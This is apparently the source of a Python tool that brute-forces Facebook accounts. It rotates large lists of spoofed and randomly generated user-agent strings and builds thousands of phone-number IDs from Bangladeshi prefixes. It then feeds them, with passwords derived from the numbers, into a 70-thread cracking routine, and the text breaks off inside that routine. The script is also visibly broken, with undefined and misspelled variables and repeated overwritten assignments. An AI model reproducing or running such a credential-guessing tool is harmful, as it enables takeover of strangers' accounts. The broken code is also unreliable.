header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"}
header_grup = {"user-agent": "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00Opera/9.60 (Windows NT 6.0; U; en) Presto/2.1.1"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"}
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41"}
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20;Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.3.8610.5 Safari/537.36;Mozilla/5.0 (Windows NT 5.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.2.3576.5 Safari/537.36;Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/349.56 (KHTML, like Gecko) Mobile/J9UMJN baiduboxapp/0_17.7.6.6_enohpi_8957_628/2.01_4C2%258enohPi/1099a/P0SJ2RX4DXJT3RW906040KVOSH2E76RJUNHVIJUPCJQCZMEM2GL/1"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20;Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.3.8610.5 Safari/537.36;Mozilla/5.0 (Windows NT 5.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.2.3576.5 Safari/537.36;Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/349.56 (KHTML, like Gecko) Mobile/J9UMJN baiduboxapp/0_17.7.6.6_enohpi_8957_628/2.01_4C2%258enohPi/1099a/P0SJ2RX4DXJT3RW906040KVOSH2E76RJUNHVIJUPCJQCZMEM2GL/1"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-N909O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4414.144 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 630"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0"}
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"}
header_grup = {"user-agent": "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00Opera/9.60 (Windows NT 6.0; U; en) Presto/2.1.1"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"}
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41"}
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20;Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.3.8610.5 Safari/537.36;Mozilla/5.0 (Windows NT 5.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.2.3576.5 Safari/537.36;Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/349.56 (KHTML, like Gecko) Mobile/J9UMJN baiduboxapp/0_17.7.6.6_enohpi_8957_628/2.01_4C2%258enohPi/1099a/P0SJ2RX4DXJT3RW906040KVOSH2E76RJUNHVIJUPCJQCZMEM2GL/1"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
#Afridi2=requests.get("https://github.com/Emran-cyber99487/EMRAN-ok-id/blob/main/Approved.txt").text
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0"}
#er=requests.get("https://github.com/Emran-cyber99487/EMRAN-ok-id/blob/main/Approved.txt").text
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"}
header_grup = {"user-agent": "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20;Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.3.8610.5 Safari/537.36;Mozilla/5.0 (Windows NT 5.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.2.3576.5 Safari/537.36;Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/349.56 (KHTML, like Gecko) Mobile/J9UMJN baiduboxapp/0_17.7.6.6_enohpi_8957_628/2.01_4C2%258enohPi/1099a/P0SJ2RX4DXJT3RW906040KVOSH2E76RJUNHVIJUPCJQCZMEM2GL/1"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        _SHARIYER404_('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
uai = random.choice(["Mozilla/5.0 (Linux; Android 11; Multilaser_G_2 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/363.0.0.6.63;]","Mozilla/5.0 (Linux; Android 11; Multilaser_F_Pro_2 Build/V5_20210610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/224.0.0.9.117;]","Mozilla/5.0 (Linux; Android 13; 23028RNCAG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/362.0.0.10.67;]","Mozilla/5.0 (Linux; Android 11; Z5158 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/360.0.0.7.53;]","Mozilla/5.0 (Linux; Android 11; Twist 4 Mini Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/363.0.0.6.63;]","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36,","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36,gzip(gfe)","Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-11)","Dalvik/2.1.0 (Linux; U; Android 9; AFTWMST22 Build/PS7633.3445N)","Dalvik/2.1.0 (Linux; U; Android 10; 7LC1 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.de.6330.d4.software Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 11; PX1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 5.0.0; View Prime Build/v12bn [FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/558626621;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/558626621;FBMF/Wiko;FBBD/Wiko;FBPN/com.facebook.orca;FBDV/View Prime;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 50 Cobalt Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 13; PHP110 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; V2238 Build/TP1A.220624.014_NONFCMOD1)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T818 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO Mobile CH9n Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; T96R Build/LMY49F)"])
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :shanto = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :shanto = '√ 2009'
        elif uid[:8] in ['10000000']        :shanto = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:shanto = ' 2010'
        elif uid[:6] in ['100001']          :shanto = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :shanto = '√ 2011/2012'
        elif uid[:6] in ['100004']          :shanto = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :shanto = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :shanto = '√ 2014/2015'
        elif uid[:6] in ['100009']          :shanto = '√ 2015'
        elif uid[:5] in ['10001']           :shanto = '√ 2015/2016'
        elif uid[:5] in ['10002']           :shanto = '√ 2016/2017'
        elif uid[:5] in ['10003']           :shanto = '√ 2018/2019'
        elif uid[:5] in ['10004']           :shanto = '√ 2019/2020'
        elif uid[:5] in ['10005']           :shanto = '√ 2020'
        elif uid[:5] in ['10006','10007','']:shanto = '√ 2021'
        elif uid[:5] in ['10008']           :shanto = '√ 2022'
        elif uid[:5] in ['10009']           :shanto = '√ 2023'
        else:shanto=''
    elif len(uid) in [9,10]:
        shanto = ' √ 2008/2009'
    elif len(uid)==8:
        shanto = '√ 2007/2008'
    elif len(uid)==7:
        shanto = '√ 2006/2007'
    else:shanto=''
    return shanto
    
#'Somrat_Ar_Real_Pappa'
#'Somrat_Akta_Bukachoda'   
    
# APK CHECK
def fucker():
    lo("\t\t\033[1;97m 𝙎𝙏𝘼𝙍𝙏𝙄𝙉𝙂")
   # dynamic("SHARIYER404       ")
    os.getuid
    os.geteuid
    _SHARIYER404_("clear")
    SHARIYER404(logo)
    SHARIYER404("\033[1;97m══════════════════════════════════════════════════════")
    username = input(" 𝙀𝙉𝙏𝙀𝙍 𝙏𝙊𝙊𝙇 𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 : ")
    password = input(" 𝙀𝙉𝙏𝙀𝙍  𝙏𝙊𝙊𝙇 𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿  : ")

# Check if the username and password are valid
    if username == "DARK" and password == "SOUL":

  # Continue with the rest of the script
     print("𝙒𝙀𝙇𝘾𝙊𝙈𝙀")

    else:

  # Display an error message and exit the script
     print("𝙄𝙉𝙑𝘼𝙇𝙄𝘿")
     exit()
fucker()

def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    _SHARIYER404_("clear")
    SHAKIB(logo)
    print("\033[1;97m [01] 𝙉𝙐𝙈𝘽𝙀𝙍 𝘾𝙇𝙊𝙉𝙄𝙉𝙂")
    print("\033[1;97m [02] 𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙒𝙄𝙏𝙃 𝙈𝙀 𝙄𝙉 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆")
    print("\033[1;97m [03] 𝙁𝙊𝙇𝙇𝙊𝙒 𝙈𝙔 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙂𝙍𝙐𝙋𝙀")
    print("\033[1;97m [04] 𝙁𝙊𝙇𝙇𝙊𝙒 𝙈𝙔 𝙂𝙄𝙏𝙃𝙐𝘽 𝘼𝘾𝘾𝙊𝙐𝙉𝙏")
    print("\033[1;97m [00] 𝙀𝙓𝙄𝙏")
    print("\n\033[1;97m══════════════════════════════════════════════════════")
    shakibhk = input(f' \033[1;97m𝗖𝗛𝗢𝗢𝗦𝗘 : ')
    if shakibhk in ["1","01"]:
    	print("")
    if shakibhk in ["2","02"]:
      _SHARIYER404_('xdg-open https://www.facebook.com/profile.php?id=100076836152171')
    if Sharriyer404hk in ["3","03"]:
    	_SHARIYER404_('xdg-open https://facebook.com/groups/814354150210238/')
    if shariyer404hk in ["4","04"]:
    	_SHARIYER404_('xdg-open https://github.com/SHAKIB-71')

    _SHARIYER404_("clear")
    SHARIYER404(logo)
    SHARIYER404(f' \033[1;97m 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : 019,017,018,92302,92301,917781')
    SHARIYER404("  \033[1;97m══════════════════════════════════════════════════════")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    code = random.choice([rk1,rk2,rk3])                      
    pww = input(f' \033[1;97m 𝗖𝗛𝗢𝗢𝗦𝗘 : ')
    _SHARIYER404_('clear')
    print(logo)
    limit = int(input(f' \033[1;97m 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : 5000, 20000, 50000 \n \033[1;97m══════════════════════════════════════════════════════\n\033[1;97m  𝗣𝗨𝗧 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗟𝗜𝗠𝗜𝗧 : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    _SHARIYER404_("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"  \033[1;92m 𝙀𝙉𝙏𝙀𝙍 𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿 {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=70) as manshera:
        clear()
        tl = str(len(user))
        print(' \033[1;97m[•] 𝗧𝗢𝗧𝗔𝗟 𝗜𝗗 𝗟𝗜𝗠𝗜𝗧  '+tl)
        print(f" \033[1;97m[•] 𝗬𝗢𝗨 𝗖𝗛𝗢𝗢𝗦𝗘 𝗡𝗨𝗠𝗕𝗘𝗥 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 ")
        print(f" \033[1;97m[•] 𝗖𝗟𝗢𝗡𝗘 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚 𝗧𝗜𝗠𝗘 {dt_string}")
        print(f' \033[1;97m[•] 𝗪𝗔𝗜𝗧 𝗠𝗢𝗧𝗛𝗘𝗥 𝗧𝗢𝗦𝗧 ')
        print(f" \033[1;97m[•] 𝗦𝗧𝗢𝗣 𝗣𝗥𝗢𝗦𝗦𝗘𝗦 𝗣𝗥𝗘𝗦𝗦 𝗖𝗧𝗥𝗟 + 𝗭")
        print(f" \033[1;97m════════════════════════════════════════════════")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} \033[1;97m\033[1;97m════════════════════════════════════════════════")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
